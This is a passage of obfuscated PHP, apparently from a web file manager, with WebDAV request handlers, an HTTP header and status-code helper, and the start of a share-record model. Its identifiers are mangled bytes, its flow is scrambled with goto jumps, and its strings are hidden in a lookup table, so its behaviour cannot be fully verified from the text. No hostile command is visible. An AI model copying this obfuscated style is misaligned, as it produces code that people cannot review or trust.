$AéŞ´£…š[$e×ÏƒÒá†»[28]]; $c…Öó×â„… = $e×ÏƒÒá†»[8] . str_replace($e×ÏƒÒá†»[168], $e×ÏƒÒá†»[8], rawurlencode($c…Öó×â„…)); goto b¨¹¯˜é¸İ; fî«ˆøÌç‰: } public function parseItemXml($D¶Ş­Ã¿, $f‚¡‚¡çÊ) { $Aê«‹å³Ù =& $_SERVER[õëù©û]; $câŠ‹öé»© = $this->parseItem($D¶Ş­Ã¿, $f‚¡‚¡çÊ); if ($D¶Ş­Ã¿[$Aê«‹å³Ù[29]] == $Aê«‹å³Ù[76]) { $d£ğ¬‡™ = $Aê«‹å³Ù[1757]; $d£ğ¬‡™ .= $Aê«‹å³Ù[1758]; } else { $B×Ãï‡çğ = $D¶Ş­Ã¿[$Aê«‹å³Ù[156]] ? $D¶Ş­Ã¿[$Aê«‹å³Ù[156]] : get_path_ext($D¶Ş­Ã¿[$Aê«‹å³Ù[28]]); $A÷×ÆŸ…ø¤ = get_file_mime($B×Ãï‡çğ); $d£ğ¬‡™ = $Aê«‹å³Ù[1759]; $d£ğ¬‡™ .= "\74\104\x3a\147\x65\164\143\x6f\x6e\164\145\x6e\x74\164\x79\160\145\76{$A÷×ÆŸ…ø¤}\x3c\57\104\x3a\147\145\x74\143\157\x6e\x74\x65\156\164\164\x79\160\145\76"; } return "\xa\11\11\74\x44\72\x72\145\x73\x70\x6f\156\163\145\76\12\x9\x9\x9\74\104\x3a\x68\162\x65\146\76{$câŠ‹öé»©[$Aê«‹å³Ù[1754]]}\74\x2f\x44\72\150\162\x65\x66\x3e\xa\x9\11\11\74\x44\x3a\x70\x72\157\160\x73\164\141\164\76\xa\11\x9\11\11\x3c\104\72\160\162\x6f\x70\x3e\xa\x9\x9\11\x9\x9\74\104\72\x67\145\164\154\x61\163\x74\155\157\x64\151\146\x69\x65\144\76{$câŠ‹öé»©[$Aê«‹å³Ù[106]]}\x3c\x2f\x44\x3a\x67\145\x74\154\x61\x73\164\x6d\157\144\151\146\x69\145\144\76\xa\11\11\x9\11\11\74\104\x3a\x63\x72\x65\x61\x74\151\157\x6e\x64\141\164\x65\76{$câŠ‹öé»©[$Aê«‹å³Ù[183]]}\x3c\x2f\x44\x3a\x63\162\x65\141\x74\x69\x6f\156\x64\141\164\x65\76\xa\x9\11\x9\x9\11\x3c\x44\72\x67\145\x74\x63\157\156\164\x65\x6e\x74\154\145\x6e\x67\x74\150\x3e{$câŠ‹öé»©[$Aê«‹å³Ù[77]]}\x3c\57\x44\x3a\147\x65\164\x63\157\x6e\164\x65\x6e\x74\x6c\x65\156\147\164\x68\x3e\xa\x9\11\11\11\11{$d£ğ¬‡™}\12\11\11\x9\x9\74\57\104\x3a\160\x72\157\160\76\12\x9\x9\11\11\74\104\x3a\x73\x74\141\x74\x75\163\76\x48\x54\124\x50\57\61\x2e\x31\x20\x32\60\60\40\x4f\x4b\x3c\57\x44\72\x73\x74\141\x74\165\x73\76\xa\11\x9\x9\x3c\x2f\x44\72\x70\162\x6f\160\163\x74\141\x74\76\xa\x9\11\74\x2f\104\x3a\162\145\163\160\x6f\156\x73\145\76"; } public function pathListMerge($bˆØ›±ÕàÀ) { goto dÚ´ÔÂ¿Ù; E¯–áßÓÍì: $bóä»óÃ¾ƒ = array(); foreach ($bˆØ›±ÕàÀ as $E‚º¼»”‚Â => $f…®òà‡Æ) { if (!in_array($E‚º¼»”‚Â, $e¡¶‰È¤‰Æ) || !is_array($f…®òà‡Æ)) { continue; } $bóä»óÃ¾ƒ = array_merge($bóä»óÃ¾ƒ, $f…®òà‡Æ); } foreach ($bóä»óÃ¾ƒ as &$Fìè¢İ…œ ) { $Fìè¢İ…œ [$D÷µø˜ä¦[28]] = str_replace($D÷µø˜ä¦[8], $D÷µø˜ä¦[1357], $Fìè¢İ…œ [$D÷µø˜ä¦[28]]); } goto A¹òèóÙë; A¹òèóÙë: return $bóä»óÃ¾ƒ; goto fÄŠ¦œµ; dÚ´ÔÂ¿Ù: $D÷µø˜ä¦ =& $_SERVER[õëù©û]; if (!$bˆØ›±ÕàÀ) { return $bˆØ›±ÕàÀ; } $e¡¶‰È¤‰Æ = array($D÷µø˜ä¦[73], $D÷µø˜ä¦[74], $D÷µø˜ä¦[1760]); goto E¯–áßÓÍì; fÄŠ¦œµ: } public function httpPROPFIND() { goto eää˜è«‡; e¾Ôòá ½: if ($fì—ÛÏ–¿Ç) { $f‘ƒ‹˜Ş±» = array($FòÓÜ§ÛØ); } else { $FòÓÜ§ÛØ[$b­Ë•¦ùò‹[28]] = $b­Ë•¦ùò‹[33]; $f‘ƒ‹˜Ş±» = array_merge(array($FòÓÜ§ÛØ), $f‘ƒ‹˜Ş±»); } $dÃÇêîÙÑ = $b­Ë•¦ùò‹[33]; foreach ($f‘ƒ‹˜Ş±» as $fãÛÂ¬º´í) { $dÃÇêîÙÑ .= $this->parseItemXml($fãÛÂ¬º´í, $fì—ÛÏ–¿Ç); } goto E®±…ğ¬±; eää˜è«‡: $b­Ë•¦ùò‹ =& $_SERVER[õëù©û]; $D’‚¾ÁÃ¢ = $this->pathList($this->path); $f‘ƒ‹˜Ş±» = $this->pathListMerge($D’‚¾ÁÃ¢); goto døóÂš“¶§; døóÂš“¶§: $FòÓÜ§ÛØ = $D’‚¾ÁÃ¢[$b­Ë•¦ùò‹[1761]]; if (!is_array($f‘ƒ‹˜Ş±») || $FòÓÜ§ÛØ[$b­Ë•¦ùò‹[1762]] === !1) { return array($b­Ë•¦ùò‹[1763] => 404, $b­Ë•¦ùò‹[1764] => $b­Ë•¦ùò‹[1765]); } $fì—ÛÏ–¿Ç = $FòÓÜ§ÛØ[$b­Ë•¦ùò‹[29]] == $b­Ë•¦ùò‹[163] || HttpHeader::get($b­Ë•¦ùò‹[1740]) == $b­Ë•¦ùò‹[463]; goto e¾Ôòá ½; E®±…ğ¬±: return array($b­Ë•¦ùò‹[1763] => 207, $b­Ë•¦ùò‹[1764] => "\x3c\104\72\x6d\x75\x6c\164\x69\163\164\141\164\x75\x73\x20\170\155\x6c\156\x73\72\x44\75\42\x44\x41\126\x3a\x22\76\12{$dÃÇêîÙÑ}\xa\x3c\x2f\104\x3a\155\x75\x6c\164\151\163\x74\x61\x74\x75\163\76"); goto C×¸éïò“œ; C×¸éïò“œ: } public function httpHEAD() { $CÚ³¸Ä›…Ç =& $_SERVER[õëù©û]; $CÍ§¹ø“˜Ä = $this->pathInfo($this->path); if (!$CÍ§¹ø“˜Ä || $CÍ§¹ø“˜Ä[$CÚ³¸Ä›…Ç[29]] == $CÚ³¸Ä›…Ç[76]) { return array($CÚ³¸Ä›…Ç[1023] => 200, $CÚ³¸Ä›…Ç[1190] => array($CÚ³¸Ä›…Ç[1766])); } return array($CÚ³¸Ä›…Ç[1023] => 200, $CÚ³¸Ä›…Ç[1190] => array($CÚ³¸Ä›…Ç[1767], $CÚ³¸Ä›…Ç[135], $CÚ³¸Ä›…Ç[1768] . $CÍ§¹ø“˜Ä[$CÚ³¸Ä›…Ç[77]], $CÚ³¸Ä›…Ç[1769] . get_file_mime($CÍ§¹ø“˜Ä[$CÚ³¸Ä›…Ç[156]]), $CÚ³¸Ä›…Ç[131] . gmdate($CÚ³¸Ä›…Ç[1755], $CÍ§¹ø“˜Ä[$CÚ³¸Ä›…Ç[1237]]) . $CÚ³¸Ä›…Ç[1770], $CÚ³¸Ä›…Ç[1771])); } public function httpOPTIONS() { $aËà±¦‹µ =& $_SERVER[õëù©û]; return array($aËà±¦‹µ[1023] => 200, $aËà±¦‹µ[1190] => array($aËà±¦‹µ[1772], $aËà±¦‹µ[1773], $aËà±¦‹µ[1774], $aËà±¦‹µ[1246])); } public function httpPROPPATCH() { $a‘Ü×Œ“Î¯ =& $_SERVER[õëù©û]; $d³ë…‰Û–Ü = $a‘Ü×Œ“Î¯[1775] . $_SERVER[$a‘Ü×Œ“Î¯[1355]] . $a‘Ü×Œ“Î¯[1776]; return array($a‘Ü×Œ“Î¯[1763] => 207, $a‘Ü×Œ“Î¯[1764] => "\x3c\104\72\x6d\165\154\164\151\x73\164\141\x74\x75\x73\x20\x78\155\x6c\156\x73\72\104\75\42\x44\x41\126\72\42\76\xa{$d³ë…‰Û–Ü}\xa\x3c\57\104\x3a\155\165\154\164\151\163\164\141\x74\x75\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $B×§Ëæ×¬ô =& $_SERVER[õëù©û]; $EÀƒ¿¸¯õ = $this->uploadFile(); if ($EÀƒ¿¸¯õ) { $E Š¾ŠñÚ… = 204; } else { $EÀƒ¿¸¯õ = $B×§Ëæ×¬ô[33]; $E Š¾ŠñÚ… = 201; } $Bí”öæ®‚ = $this->pathPut($this->path, $EÀƒ¿¸¯õ); if ($Bí”öæ®‚ == !1) { $E Š¾ŠñÚ… = 404; } return array($B×§Ëæ×¬ô[1763] => $E Š¾ŠñÚ…); } private function uploadFile() { goto D‘ÓÄÜÙÏ¢; eŸ”‚ŠªáË: if (@filesize($c­±ô µùÖ) > 0) { return $c­±ô µùÖ; } @unlink($c­±ô µùÖ); return !1; goto F®ä†¾ÄÅ; CÉâŒÀ¯: while (!feof($b†çØ£ªŞ )) { fwrite($eÒèäÑ‘¼‹, fread($b†çØ£ªŞ , 1024 * 200)); } fclose($b†çØ£ªŞ ); fclose($eÒèäÑ‘¼‹); goto eŸ”‚ŠªáË; D‘ÓÄÜÙÏ¢: $AÑöîæ‹ê¶ =& $_SERVER[õëù©û]; @mk_dir(TEMP_FILES); $c­±ô µùÖ = TEMP_FILES . $AÑöîæ‹ê¶[1777] . rand_string(32); goto e—šÈØšù; e—šÈØšù: $eÒèäÑ‘¼‹ = @fopen($c­±ô µùÖ, $AÑöîæ‹ê¶[1485]); $b†çØ£ªŞ  = @fopen($AÑöîæ‹ê¶[1778], $AÑöîæ‹ê¶[1484]); if (!$b†çØ£ªŞ  || !$eÒèäÑ‘¼‹) { @unlink($c­±ô µùÖ); return !1; } goto CÉâŒÀ¯; F®ä†¾ÄÅ: } public function httpMKCOL() { $a±ŒŸµåã¡ =& $_SERVER[õëù©û]; if ($this->pathExists($this->path)) { return array($a±ŒŸµåã¡[1023] => 409); } $D¡¢½ğ™‚Å = $this->pathMkdir($this->path); return array($a±ŒŸµåã¡[1023] => $D¡¢½ğ™‚Å ? 201 : 403); } public function httpMOVE() { $e™ Ÿ†î«À =& $_SERVER[õëù©û]; $F©¥¤¨£î = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$e™ Ÿ†î«À[1779]])) { $aÙÔğ¸Š÷[$e™ Ÿ†î«À[1780]] = $_SERVER[$e™ Ÿ†î«À[1779]] == $e™ Ÿ†î«À[1781]; } $b±ù×Öõ¯ = $this->pathMove($this->path, $F©¥¤¨£î); return array($e™ Ÿ†î«À[1023] => $b±ù×Öõ¯ ? 201 : 404); } public function httpCOPY() { $cÆ´Í‹¡áô = $this->parsePath($this->pathGet(!0)); $fÆè½á¯ù’ = $this->pathCopy($this->path, $cÆ´Í‹¡áô); return array($_SERVER[õëù©û][1023] => $fÆè½á¯ù’ ? 201 : 404); } public function httpDELETE() { $F´“øõ»ƒò = $this->pathRemove($this->path); return array($_SERVER[õëù©û][1023] => $F´“øõ»ƒò ? 200 : 503); } public function httpLOCK() { $D´Äíå½ª =& $_SERVER[õëù©û]; $A¥…¶Š‰£ = md5($this->path); $cöù©‡‰–İ = $D´Äíå½ª[1782] . $this->xmlGet($D´Äíå½ª[1783]) . $D´Äíå½ª[1784] . $A¥…¶Š‰£ . $D´Äíå½ª[1785]; return array($D´Äíå½ª[1023] => 200, $D´Äíå½ª[1190] => array($D´Äíå½ª[1786] . $A¥…¶Š‰£, $D´Äíå½ª[1787]), $D´Äíå½ª[1788] => $cöù©‡‰–İ); } public function httpUNLOCK() { return array($_SERVER[õëù©û][1023] => 204); } public function xmlGet($a»ä—ÚÀ¦Á) { goto a­éŒ”ÜÆµ; eÕÚÔ«Ú‚: return $Bƒ¯Îî’‘[33]; goto F¤õ…¸å”Ó; a­éŒ”ÜÆµ: $Bƒ¯Îî’‘ =& $_SERVER[õëù©û]; static $F“‘ã¿Ú = false; if (!$F“‘ã¿Ú) { $e¿Æˆ‹¸ï¸ = file_get_contents($Bƒ¯Îî’‘[1789]); $F“‘ã¿Ú = new DOMDocument(); $F“‘ã¿Ú->loadXML($e¿Æˆ‹¸ï¸); } goto Aè£‚ˆ‚¼Ñ; Aè£‚ˆ‚¼Ñ: $AëªØ—Æ¬‚ = array_shift(explode($Bƒ¯Îî’‘[8], $a»ä—ÚÀ¦Á)); $cŒ‘Ÿè§Ô = $F“‘ã¿Ú->getElementsByTagNameNS($Bƒ¯Îî’‘[1790], $AëªØ—Æ¬‚); if ($cŒ‘Ÿè§Ô) { return $cŒ‘Ÿè§Ô[0]->nodeValue; } goto eÕÚÔ«Ú‚; F¤õ…¸å”Ó: } public static function response($B“‘Ù’Ÿ’†) { goto C·ÓŒ†µ¶•; C·ÓŒ†µ¶•: $a´Èíõ‹ƒ =& $_SERVER[õëù©û]; $f—È…³à¥ = is_array($B“‘Ù’Ÿ’†[$a´Èíõ‹ƒ[1190]]) ? $B“‘Ù’Ÿ’†[$a´Èíõ‹ƒ[1190]] : array(); $f—È…³à¥[] = HttpHeader::code($B“‘Ù’Ÿ’†[$a´Èíõ‹ƒ[1023]]); goto cÔÙÖÄÃõ¡; cÔÙÖÄÃõ¡: $f—È…³à¥[] = $a´Èíõ‹ƒ[1730]; $f—È…³à¥[] = $a´Èíõ‹ƒ[1731]; foreach ($f—È…³à¥ as $F×›î¾Àê‰) { header($F×›î¾Àê‰); } goto FÓŠ×Ë¨Ş; FÓŠ×Ë¨Ş: if (is_string($B“‘Ù’Ÿ’†[$a´Èíõ‹ƒ[1788]])) { header($a´Èíõ‹ƒ[1791]); $CÎëÀŠÈôÒ = $a´Èíõ‹ƒ[1792] . $a´Èíõ‹ƒ[213] . $B“‘Ù’Ÿ’†[$a´Èíõ‹ƒ[1788]]; echo $CÎëÀŠÈôÒ; } goto bã´áİô«µ; bã´áİô«µ: } } class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\110\x54\124\x50\x5f\110\x4f\123\x54", "\x55\163\145\x72\55\101\147\145\x6e\164" => "\110\x54\124\x50\x5f\125\123\x45\x52\x5f\101\107\x45\116\124", "\103\x6f\x6e\x74\x65\156\x74\55\x54\x79\x70\x65" => "\x48\124\124\x50\137\103\x4f\x4e\124\105\116\124\137\124\x59\x50\x45", "\x43\x6f\x6e\x74\145\156\x74\x2d\114\145\x6e\x67\x74\150" => "\x48\x54\124\120\137\103\117\116\x54\x45\x4e\124\x5f\x4c\x45\116\107\124\x48", "\x44\145\160\164\x68" => "\110\124\x54\x50\x5f\x44\105\120\x54\x48", "\x45\170\160\145\143\x74" => "\x48\124\x54\120\137\105\130\x50\105\103\124", "\x49\146\55\x4e\x6f\x6e\x65\x2d\115\x61\164\x63\x68" => "\110\x54\124\120\x5f\111\106\x5f\116\x4f\116\x45\137\x4d\101\124\x43\x48", "\111\x66\55\115\141\164\x63\x68" => "\x48\124\124\x50\x5f\x49\106\x5f\x4d\101\x54\103\x48", "\111\x66\x2d\122\x61\156\147\145" => "\x48\x54\124\120\137\x49\106\137\x52\101\116\107\x45", "\114\141\163\164\55\115\157\x64\x69\146\151\145\x64" => "\110\x54\124\120\137\114\x41\123\x54\137\115\x4f\104\111\106\x49\x45\x44", "\x49\146\x2d\x4d\x6f\144\151\146\151\x65\144\x2d\x53\151\156\x63\x65" => "\x48\x54\x54\x50\x5f\111\x46\x5f\115\117\x44\111\x46\x49\105\x44\137\123\x49\116\103\105", "\x49\146\55\x55\156\x6d\157\x64\x69\x66\151\x65\x64\55\x53\151\156\143\145" => "\x48\124\124\x50\137\x49\x46\x5f\x55\116\x4d\x4f\104\111\x46\x49\x45\x44\137\x53\111\116\103\x45", "\x52\141\156\147\145" => "\x48\x54\124\120\137\x52\x41\116\x47\x45", "\124\x69\x6d\145\157\165\x74" => "\110\124\x54\120\137\x54\111\x4d\x45\117\125\x54", "\111\x66" => "\x48\124\124\x50\137\x49\x46", "\114\157\143\153\x2d\x54\x6f\153\145\156" => "\x48\x54\124\x50\x5f\x4c\x4f\103\113\137\124\117\x4b\x45\x4e", "\117\166\x65\x72\x77\x72\151\164\145" => "\110\x54\124\x50\x5f\x4f\126\x45\122\x57\122\111\124\x45", "\104\x65\163\164\x69\x6e\x61\164\151\157\156" => "\x48\x54\x54\x50\137\104\x45\123\124\x49\116\x41\124\111\x4f\x4e", "\122\x65\161\x75\x65\163\x74\x2d\x49\x64" => "\122\105\x51\x55\105\123\x54\137\x49\104", "\x52\x65\x71\165\145\163\164\x2d\102\x6f\x64\x79\x2d\106\151\x6c\145" => "\122\105\x51\x55\105\123\x54\x5f\x42\x4f\x44\x59\x5f\106\111\x4c\x45", "\x52\x65\144\x69\x72\x65\x63\x74\x2d\x53\164\x61\164\165\x73" => "\122\105\104\x49\x52\x45\103\124\x5f\123\124\101\124\x55\x53"); public static function init() { static $DœĞõƒÒä = false; if ($DœĞõƒÒä) { return; } foreach ($_SERVER as $aÆµÎÄÁì‡ => $a¤Î¼Ø¦­Ô) { $aÆµÎÄÁì‡ = strtoupper($aÆµÎÄÁì‡); if (!array_key_exists($aÆµÎÄÁì‡, $_SERVER)) { continue; } $_SERVER[$aÆµÎÄÁì‡] = $a¤Î¼Ø¦­Ô; } foreach (self::$_headers as $aÆµÎÄÁì‡ => $C…š¼ÔĞ) { if (!array_key_exists($aÆµÎÄÁì‡, $_SERVER)) { continue; } $_SERVER[$aÆµÎÄÁì‡] = $_SERVER[$C…š¼ÔĞ]; $_SERVER[strtoupper($aÆµÎÄÁì‡)] = $_SERVER[$C…š¼ÔĞ]; } } public static function get($dÍÑáñî„) { self::init(); return $_SERVER[$dÍÑáñî„] ? $_SERVER[$dÍÑáñî„] : $_SERVER[$_SERVER[õëù©û][1793] . strtoupper($dÍÑáñî„)]; } public static function method() { return strtoupper(self::get($_SERVER[õëù©û][150])); } public static function length() { $a¿»‘Á¿­ğ =& $_SERVER[õëù©û]; $C‘ÔâËïíğ = self::get($a¿»‘Á¿­ğ[1794]); if (!$C‘ÔâËïíğ) { $C‘ÔâËïíğ = self::get($a¿»‘Á¿­ğ[1129]); } return $C‘ÔâËïíğ; } public static function range() { $bñå‡î´· =& $_SERVER[õëù©û]; $C‘µŒÇ²ºï = self::get($bñå‡î´·[194]); if (!$C‘µŒÇ²ºï) { return !1; } if (!preg_match($bñå‡î´·[1795], $C‘µŒÇ²ºï, $D¸¯å¼èâ)) { return !1; } if ($D¸¯å¼èâ[1] === $bñå‡î´·[33] && $D¸¯å¼èâ[2] === $bñå‡î´·[33]) { return !1; } return array($D¸¯å¼èâ[1] !== $bñå‡î´·[33] ? $D¸¯å¼èâ[1] : null, $D¸¯å¼èâ[2] !== $bñå‡î´·[33] ? $D¸¯å¼èâ[2] : null); } public static $statusCode = array("\61\x30\x30" => "\x43\x6f\x6e\x74\x69\156\165\145", "\61\x30\61" => "\x53\167\x69\x74\x63\x68\151\x6e\147\40\x50\x72\x6f\164\x6f\x63\157\x6c", "\61\x30\x32" => "\120\x72\157\x63\145\163\x73\151\156\147", "\x31\60\x33" => "\x45\141\x72\154\171\40\110\x69\156\164\163", "\62\60\x30" => "\x4f\x4b", "\x32\x30\61" => "\x43\162\x65\x61\164\145\x64", "\62\x30\x32" => "\x41\143\x63\x65\160\x74\x65\144", "\x32\60\63" => "\116\x6f\156\x2d\x41\x75\x74\x68\157\162\x69\x74\x61\164\151\166\x65\x20\111\x6e\146\x6f\x72\x6d\141\164\151\157\x6e", "\x32\x30\64" => "\116\x6f\x20\x43\157\156\164\145\156\x74", "\62\60\x35" => "\x52\x65\x73\x65\164\x20\103\x6f\156\x74\x65\x6e\x74", "\x32\x30\66" => "\x50\141\162\x74\151\141\154\40\103\157\156\164\x65\x6e\164", "\62\x30\x37" => "\115\165\154\x74\x69\55\x53\x74\141\164\x75\x73", "\63\60\60" => "\x4d\x75\154\x74\x69\160\x6c\x65\40\x43\x68\x6f\151\x63\x65\163", "\x33\x30\61" => "\115\157\x76\145\144\40\120\x65\162\x6d\141\156\x65\156\x74\154\x79", "\63\60\62" => "\106\157\165\x6e\x64", "\x33\x30\x33" => "\x53\145\145\x20\117\x74\150\145\x72", "\x33\x30\x34" => "\116\157\164\x20\x4d\157\144\151\146\x69\145\144", "\x33\x30\x35" => "\x55\x73\145\x20\x50\162\157\170\171", "\63\60\x37" => "\124\x65\155\x70\x6f\162\141\162\171\x20\x52\145\x64\151\x72\145\143\164", "\x33\60\x38" => "\x50\145\x72\x6d\141\156\145\x6e\164\40\x52\x65\144\x69\x72\145\x63\164", "\64\60\x30" => "\x42\x61\144\x20\122\145\161\165\x65\163\164", "\64\x30\x31" => "\125\156\141\165\164\x68\157\x72\151\x7a\145\144", "\64\60\62" => "\x50\x61\171\x6d\145\156\x74\40\122\145\x71\x75\151\162\x65\x64", "\x34\x30\63" => "\106\x6f\162\142\x69\x64\x64\x65\x6e", "\x34\x30\x34" => "\116\157\x74\40\106\157\x75\156\x64", "\64\x30\x35" => "\x4d\x65\x74\x68\x6f\144\x20\x4e\157\x74\x20\x41\154\x6c\157\167\x65\x64", "\64\60\x36" => "\x4e\x6f\x74\40\x41\143\143\x65\x70\164\x61\142\154\145", "\64\60\x37" => "\120\x72\x6f\170\171\40\x41\x75\164\150\145\156\164\x69\143\x61\164\x69\x6f\x6e\40\122\145\161\165\151\162\145\x64", "\64\60\70" => "\x52\145\x71\165\145\163\x74\x20\124\x69\155\x65\157\165\164", "\x34\x30\71" => "\x43\157\156\x66\x6c\x69\143\x74", "\x34\x31\x30" => "\107\x6f\x6e\x65", "\x34\x31\x31" => "\114\x65\x6e\x67\164\x68\40\122\x65\161\x75\x69\162\x65\x64", "\x34\61\x32" => "\x50\162\x65\143\157\x6e\x64\151\164\x69\x6f\x6e\x20\106\141\151\154\145\x64", "\x34\61\x33" => "\122\x65\x71\165\x65\163\164\40\x45\156\x74\x69\x74\171\40\x54\157\157\40\x4c\x61\x72\147\145", "\64\x31\x34" => "\x52\145\x71\x75\145\163\x74\x20\125\x52\x49\40\x54\157\x6f\40\114\x61\162\147\x65", "\64\x31\x35" => "\125\x6e\163\x75\x70\160\x6f\162\164\145\144\40\115\145\x64\x69\x61\40\124\x79\x70\145", "\64\61\66" => "\122\145\x71\165\145\x73\x74\145\144\x20\x52\x61\x6e\147\145\x20\116\x6f\x74\40\x53\141\164\151\163\146\x69\141\x62\154\145", "\64\61\67" => "\105\x78\160\145\x63\x74\x61\x74\x69\x6f\x6e\40\106\141\151\154\145\144", "\x34\x32\x32" => "\x55\156\x70\x72\x6f\x63\145\x73\163\x61\x62\x6c\145\40\105\156\164\x69\164\x79", "\64\x32\63" => "\x4c\157\x63\153\x65\144", "\64\x32\x34" => "\106\x61\x69\154\145\144\40\104\x65\160\x65\x6e\x64\x65\x6e\x63\171", "\64\62\x35" => "\125\x6e\x6f\x72\144\145\x72\x65\144\40\x43\x6f\154\154\x65\x63\164\x69\157\x6e", "\x34\62\x36" => "\x55\160\147\x72\141\144\145\40\122\x65\161\x75\x69\162\145\x64", "\x34\x32\x38" => "\x50\x72\x65\143\x6f\156\144\x69\164\x69\157\156\40\x52\145\161\165\x69\162\x65\144", "\x34\62\x39" => "\124\157\x6f\40\115\141\x6e\171\40\x52\x65\161\x75\145\x73\x74\163", "\x34\x33\x31" => "\122\x65\x71\x75\x65\163\164\40\x48\145\141\x64\x65\162\40\106\151\145\x6c\x64\x73\40\x54\157\x6f\x20\114\141\162\x67\145", "\x34\x34\64" => "\116\x6f\40\122\x65\x73\x70\157\156\x73\x65", "\64\65\x30" => "\102\x6c\157\143\153\145\x64\x20\142\171\x20\127\151\156\x64\157\x77\x73\x20\x50\x61\x72\145\156\164\141\154\40\x43\x6f\156\164\162\157\x6c\163", "\64\x35\x31" => "\x55\156\141\x76\x61\x69\154\x61\142\x6c\145\x20\106\157\162\40\x4c\145\x67\x61\154\x20\122\145\x61\163\157\x6e\x73", "\x34\x39\x34" => "\122\x65\161\165\145\x73\x74\40\x48\145\141\x64\145\x72\x20\x54\157\x6f\x20\114\141\162\x67\145", "\65\60\60" => "\x49\156\x74\x65\162\x6e\x61\x6c\40\x53\145\x72\166\x65\162\x20\x45\x72\x72\157\162", "\x35\60\61" => "\x4e\x6f\164\x20\x49\x6d\x70\x6c\145\155\145\156\x74\x65\x64", "\x35\x30\62" => "\102\x61\x64\40\107\x61\x74\145\167\x61\171", "\65\x30\x33" => "\123\145\x72\166\151\x63\x65\x20\125\x6e\141\x76\x61\151\154\141\142\x6c\145", "\x35\x30\x34" => "\x47\x61\x74\145\x77\x61\171\40\124\151\x6d\145\157\165\164", "\65\x30\65" => "\x48\x54\124\120\x20\126\145\162\x73\x69\157\156\x20\156\157\x74\x20\163\165\x70\x70\x6f\162\164\145\144", "\65\60\67" => "\x49\x6e\163\x75\x66\x66\151\143\151\145\156\x74\40\x53\x74\x6f\x72\141\x67\145"); public static function code($D²½ÃçÃÀ¬) { $a¸…á½®ää =& $_SERVER[õëù©û]; $D²½ÃçÃÀ¬ = $D²½ÃçÃÀ¬ . $a¸…á½®ää[33]; $C´¯ô = self::$statusCode[$D²½ÃçÃÀ¬]; $C´¯ô = $C´¯ô ? "\x48\124\x54\x50\57\61\x2e\61\x20{$D²½ÃçÃÀ¬}\x20" . $C´¯ô : $a¸…á½®ää[33]; return $C´¯ô; } } goto f¯‡ïã—ÉÕ; eˆÛäêÌ—¦: class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\145"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\124\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\164\54\x75\160\x64\x61\x74\x65", "\146\x75\156\x63\x74\151\157\156"), array("\x63\162\x65\141\x74\145\x54\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\143\x74\x69\x6f\x6e"), array("\x6f\x70\164\151\157\x6e\163", '', "\151\x6e\163\145\162\x74\x2c\x75\160\144\x61\x74\145\54\x73\145\154\x65\x63\164", "\x6a\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Eô½‚•èî) { $FÒÂËø†Éğ =& $_SERVER[õëù©û]; $D×†¬£„˜Ò = isset($Eô½‚•èî[0]) ? $Eô½‚•èî[0] : !1; return array($FÒÂËø†Éğ[2173] => array(USER_ID, $FÒÂËø†Éğ[2174]), $FÒÂËø†Éğ[2136] => array($D×†¬£„˜Ò, $FÒÂËø†Éğ[2175])); } protected function listSimple() { $EãòÀ˜®ğ’ = array($_SERVER[õëù©û][1404] => USER_ID); $bĞ²²ç×ÜÅ = $this->field($this->fieldList)->where($EãòÀ˜®ğ’)->select(); return $bĞ²²ç×ÜÅ ? $bĞ²²ç×ÜÅ : array(); } protected function getInfo($Aæº…áËó, $D«£ÚÅ¡¥å = false) { $e¯£‹¯´£ =& $_SERVER[õëù©û]; if ($D«£ÚÅ¡¥å) { return $this->_getShareInfo(array($e¯£‹¯´£[436] => $Aæº…áËó)); } $fË»ĞÁ¸œ = $this->cacheFunctionGet($e¯£‹¯´£[2176], $Aæº…áËó); return $fË»ĞÁ¸œ; } public function getInfoByHash($f©‰¸Ï¢ì­) { return $this->_getShareInfo(array($_SERVER[õëù©û][438] => $f©‰¸Ï¢ì­)); } public function getInfoByPath($C†Ï÷ï™Õ) { $a«Ê¹ˆÚé¼ =& $_SERVER[õëù©û]; $dÂå§å‘Ô = array($a«Ê¹ˆÚé¼[1404] => USER_ID, $a«Ê¹ˆÚé¼[365] => $C†Ï÷ï™Õ); return $this->_getShareInfo($dÂå§å‘Ô); } public function getInfoBySourcePath($Fİôßš•»Õ) { $bõÒñ·Ìà =& $_SERVER[õëù©û]; $D´ø¨ìµ¼¶ = array($bõÒñ·Ìà[1404] => USER_ID, $bõÒñ·Ìà[1009] => $Fİôßš•»Õ); return $this->_getShareInfo($D´ø¨ìµ¼¶); } private function _getShareInfo($CÜ®¤ƒ¨ÛŞ) { goto cÒÊØ¿˜Šó; a“´Ç¢‚¤: if ($DÙ¬§ù¨ [$bÙèÖóéç…[365]] == $bÙèÖóéç…[463]) { $DÙ¬§ù¨ [$bÙèÖóéç…[387]] = IO::info($DÙ¬§ù¨ [$bÙèÖóéç…[1009]]); } else { $DÙ¬§ù¨ [$bÙèÖóéç…[387]] = Model($bÙèÖóéç…[1101])->pathInfo($DÙ¬§ù¨ [$bÙèÖóéç…[365]]); } $DÙ¬§ù¨ [$bÙèÖóéç…[2178]] = $Aï³çÉóÈ‡; return $DÙ¬§ù¨ ; goto eÔ„ƒÔ Éö; bÌŒòä›Ó: $CÜ®¤ƒ¨ÛŞ = array($bÙèÖóéç…[436] => $DÙ¬§ù¨ [$bÙèÖóéç…[436]]); $aêÊ»ç‚¤ = $bÙèÖóéç…[2177]; $Aï³çÉóÈ‡ = Model($bÙèÖóéç…[532])->order($bÙèÖóéç…[363])->field($aêÊ»ç‚¤)->where($CÜ®¤ƒ¨ÛŞ)->select(); goto a“´Ç¢‚¤; cÒÊØ¿˜Šó: $bÙèÖóéç… =& $_SERVER[õëù©û]; $DÙ¬§ù¨  = $this->where($CÜ®¤ƒ¨ÛŞ)->find(); if (!$DÙ¬§ù¨ ) { return !1; } goto bÌŒòä›Ó; eÔ„ƒÔ Éö: } protected function getInfoAuth($a™ŸÜé×°Î) { $BÄ„¥©¦ŠÀ =& $_SERVER[õëù©û]; $Aš±ÔÌ½ò» = $this->getInfo($a™ŸÜé×°Î); $Aš±ÔÌ½ò»[$BÄ„¥©¦ŠÀ[372]] = 